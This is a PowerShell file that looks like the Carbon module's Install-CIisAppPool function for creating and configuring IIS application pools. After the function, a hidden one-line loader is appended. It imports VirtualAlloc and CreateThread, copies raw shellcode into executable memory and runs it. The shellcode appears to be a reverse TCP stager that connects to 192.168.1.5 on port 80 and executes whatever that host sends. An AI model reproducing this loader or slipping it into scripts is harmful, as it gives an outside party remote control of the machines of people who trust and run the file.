
function Install-CIisAppPool
{
    
    [CmdletBinding(DefaultParameterSetName='AsServiceAccount')]
    [OutputType([Microsoft.Web.Administration.ApplicationPool])]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute("PSAvoidUsingUserNameAndPassWordParams","")]
    param(
        [Parameter(Mandatory=$true)]
        [string]
        
        $Name,
        
        [string]
        [ValidateSet('v1.0','v1.1','v2.0','v4.0','')]
        
        $ManagedRuntimeVersion = 'v4.0',
        
        [int]
        [ValidateScript({$_ -gt 0})]
        
        $IdleTimeout = 0,
        
        [Switch]
        
        $ClassicPipelineMode,
        
        [Switch]
        
        $Enable32BitApps,
        
        [string]
        [ValidateSet('NetworkService','LocalService','LocalSystem')]
        
        $ServiceAccount,
        
        [Parameter(ParameterSetName='AsSpecificUser',Mandatory=$true,DontShow=$true)]
        [string]
        
        $UserName,
        
        [Parameter(ParameterSetName='AsSpecificUser',Mandatory=$true,DontShow=$true)]
        
        $Password,

        [Parameter(ParameterSetName='AsSpecificUserWithCredential',Mandatory=$true)]
        [pscredential]
        
        
        
        $Credential,

        [Switch]
        
        $PassThru
    )

    Set-StrictMode -Version 'Latest'

    Use-CallerPreference -Cmdlet $PSCmdlet -Session $ExecutionContext.SessionState
    
    if( $PSCmdlet.ParameterSetName -like 'AsSpecificUser*' )
    {
        if( $PSCmdlet.ParameterSetName -notlike '*WithCredential' ) 
        {
            Write-Warning ('`Install-CIisAppPool` function''s `UserName` and `Password` parameters are obsolete and will be removed in a future major version of Carbon. Please use the `Credential` parameter instead.')
            $Credential = New-CCredential -UserName $UserName -Password $Password
        }
    }

    if( $PSCmdlet.ParameterSetName -eq 'AsSpecificUser' -and -not (Test-CIdentity -Name $Credential.UserName) )
    {
        Write-Error ('Identity {0} not found. {0} IIS websites and applications assigned to this app pool won''t run.' -f $Credential.UserName,$Name)
    }
    
    if( -not (Test-CIisAppPool -Name $Name) )
    {
        Write-Verbose ('Creating IIS Application Pool {0}' -f $Name)
        $mgr = New-Object 'Microsoft.Web.Administration.ServerManager'
        $appPool = $mgr.ApplicationPools.Add($Name)
        $mgr.CommitChanges()
    }

    $appPool = Get-CIisAppPool -Name $Name
    
    $updated = $false

    if( $appPool.ManagedRuntimeVersion -ne $ManagedRuntimeVersion )
    {
        Write-Verbose ('IIS Application Pool {0}: Setting ManagedRuntimeVersion = {0}' -f $Name,$ManagedRuntimeVersion)
        $appPool.ManagedRuntimeVersion = $ManagedRuntimeVersion
        $updated = $true
    }

    $pipelineMode = [Microsoft.Web.Administration.ManagedPipelineMode]::Integrated
    if( $ClassicPipelineMode )
    {
        $pipelineMode = [Microsoft.Web.Administration.ManagedPipelineMode]::Classic
    }
    if( $appPool.ManagedPipelineMode -ne $pipelineMode )
    {
        Write-Verbose ('IIS Application Pool {0}: Setting ManagedPipelineMode = {0}' -f $Name,$pipelineMode)
        $appPool.ManagedPipelineMode = $pipelineMode
        $updated = $true
    }

    $idleTimeoutTimeSpan = New-TimeSpan -Minutes $IdleTimeout
    if( $appPool.ProcessModel.IdleTimeout -ne $idleTimeoutTimeSpan )
    {
        Write-Verbose ('IIS Application Pool {0}: Setting idle timeout = {0}' -f $Name,$idleTimeoutTimeSpan)
        $appPool.ProcessModel.IdleTimeout = $idleTimeoutTimeSpan 
        $updated = $true
    }

    if( $appPool.Enable32BitAppOnWin64 -ne ([bool]$Enable32BitApps) )
    {
        Write-Verbose ('IIS Application Pool {0}: Setting Enable32BitAppOnWin64 = {0}' -f $Name,$Enable32BitApps)
        $appPool.Enable32BitAppOnWin64 = $Enable32BitApps
        $updated = $true
    }
    
    if( $PSCmdlet.ParameterSetName -like 'AsSpecificUser*' )
    {
        if( $appPool.ProcessModel.UserName -ne $Credential.UserName )
        {
            Write-Verbose ('IIS Application Pool {0}: Setting username = {0}' -f $Name,$Credential.UserName)
            $appPool.ProcessModel.IdentityType = [Microsoft.Web.Administration.ProcessModelIdentityType]::SpecificUser
            $appPool.ProcessModel.UserName = $Credential.UserName
            $appPool.ProcessModel.Password = $Credential.GetNetworkCredential().Password

            
            Grant-CPrivilege -Identity $Credential.UserName -Privilege SeBatchLogonRight -Verbose:$VerbosePreference
            $updated = $true
        }
    }
    else
    {
        $identityType = [Microsoft.Web.Administration.ProcessModelIdentityType]::ApplicationPoolIdentity
        if( $ServiceAccount )
        {
            $identityType = $ServiceAccount
        }

        if( $appPool.ProcessModel.IdentityType -ne $identityType )
        {
            Write-Verbose ('IIS Application Pool {0}: Setting IdentityType = {0}' -f $Name,$identityType)
            $appPool.ProcessModel.IdentityType = $identityType
            $updated = $true
        }
    }

    if( $updated )
    {
        $appPool.CommitChanges()
    }
    
    
    $appPool = Get-CIisAppPool -Name $Name
    if($appPool -and $appPool.state -eq [Microsoft.Web.Administration.ObjectState]::Stopped )
    {
        try
        {
            $appPool.Start()
        }
        catch
        {
            Write-Error ('Failed to start {0} app pool: {1}' -f $Name,$_.Exception.Message)
        }
    }

    if( $PassThru )
    {
        $appPool
    }
}


$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x05,0x68,0x02,0x00,0x00,0x50,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

